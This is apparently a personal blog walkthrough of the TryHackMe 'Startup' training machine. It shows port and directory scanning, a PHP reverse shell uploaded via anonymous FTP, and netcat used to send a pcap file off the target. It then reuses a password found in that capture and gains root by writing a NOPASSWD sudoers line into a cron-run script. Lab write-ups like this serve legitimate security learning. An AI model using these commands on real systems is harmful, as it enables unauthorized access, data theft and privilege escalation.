# TryHackMe - Startup (Write-Up)

_5 min read · April 1, 2026 · by qs18_

---

## Entry Log

In this mini-blog, I’ll be showing you the walkthrough for [**Startup**](https://tryhackme.com/room/startup) machine from [**TryHackMe**](https://tryhackme.com/).

- Goal: Obtain Secret Recipe, User and Root Flag
- Difficulty: Easy
- Machine Author: elbee

---

## Scanning for Open Ports

Machine IP: 10.49.168.244.

As usual, I started with an [**Nmap**](https://www.kali.org/tools/nmap/) scan:

```bash
nmap -T4 -p- 10.49.168.244
sudo nmap -sCV -p 21,22,80 10.49.168.244
```

![Nmap Output](./img/thm-startup/Nmap-output.png)

From the scan result, I noticed that:

- FTP (port 21) is open, anonymous login is allowed and there is one writable directory with two files.
- SSH (port 22) is open.
- HTTP (port 80) is open.

As usual, I browsed the site first.

![Startup: Website](./img/thm-startup/web.png)

Nothing interesting here as well as in the source code.

---

## Futher Enumeration on the Website

Next, I used [**Gobuster**](https://www.kali.org/tools/gobuster/) to enumerate the directories.

```bash
gobuster dir -u http://10.49.168.244 -w /usr/share/wordlists/dirb/big.txt -t 100
```

![Gobuster Output](./img/thm-startup/gobuster-output.png)

I then accessed `/files` and found the same directory and files as seen earlier from the Nmap output.

![Startup: Web /files](./img/thm-startup/web-files.png)

At this point, I thought I could upload a reverse shell into the `/ftp` directory and access it through the browser.

---

## Gaining the Machine Shell

I copied a PHP reverse shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
```

Note: Don't forget to change the IP and port inside the file.

Then I uploaded it via FTP:

```bash
ftp 10.49.165.79
cd ftp
put php-reverse-shell.php
```

```output
local: php-reverse-shell.php remote: php-reverse-shell.php
229 Entering Extended Passive Mode (|||39253|)
150 Ok to send data.
100% |********************************|  5491       59.50 MiB/s    00:00 ETA
226 Transfer complete.
5491 bytes sent in 00:00 (33.11 KiB/s)
```

![Startup: Web /files/ftp](./img/thm-startup/web-filesftp.png)

The file uploaded successfully.

I set up a listener using [**netcat**](https://www.kali.org/tools/netcat/):

```bash
nc -lvp 4418
```

After clicking the uploaded file in the browser, I successfully received a reverse shell.

Once inside, I enumerated the directory and found the **secret recipe**:

```output
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```

---

## Post-Exploitation

During enumeration, I found a suspicious file called `suspicious.pcapng` in `/incidents` directory. I used netcat to download it.

On my machine:

```bash
nc -lvp 4481 > suspicious.pcapng
```

On target machine:

```bash
nc 192.168.223.226 4481 < suspicious.pcapng
```

After opening the PCAP file and following the TCP stream, I found credentials.

![Credentials in PCAP file](./img/thm-startup/suspcap.png)

I first tried them on `www-data`, but it failed.

Then I tried switching user to `lennie`:

```bash
su lennie
c4ntg3t3n0ughsp1c3
```

It worked and I found the **user flag**.

![User Flag](./img/thm-startup/user-flag.png)

---

## Privilege Escalation

Inside the `/scripts` directory, I found:

- `planner.sh` → owned by root.
- `print.sh` → owned by user `lennie` (writable).

![Lennie Enum](./img/thm-startup/lennie-enum.png)

`planner.sh` executes `print.sh`, which means I can potentially execute commands as root.

I checked for cron jobs but couldn’t find anything useful related to `planner.sh`.

So instead, I decided to test if the script is being executed automatically by adding a logging payload:

```bash
echo 'echo "ran at $(date)" >> /tmp/proof.txt' > /etc/print.sh
```

After waiting for a while, I checked the `proof.txt`:

```output
ran at Wed Apr  1 14:48:01 UTC 2026
ran at Wed Apr  1 14:49:01 UTC 2026
ran at Wed Apr  1 14:50:01 UTC 2026
ran at Wed Apr  1 14:51:01 UTC 2026
```

This confirmed that the script is being executed every minute.

Since the script runs as root, I inserted a privesc payload:

```bash
echo 'echo "lennie ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > /etc/print.sh
```

After about a minute, I ran:

```bash
sudo -i
```

And I successfully became root.

I then navigated to `/root` directory and retrieved the **root flag**.

![Root Flag](./img/thm-startup/root-flag.png)

Bomba! Settleee.

---

## Session Terminated

From this machine, I learned how to:

- analyze PCAP files to extract credentials
- perform credential reuse for lateral movement
- identify writable scripts for privilege escalation
- confirm cron execution using manual logging techniques

Thank you for reading and see you next time!
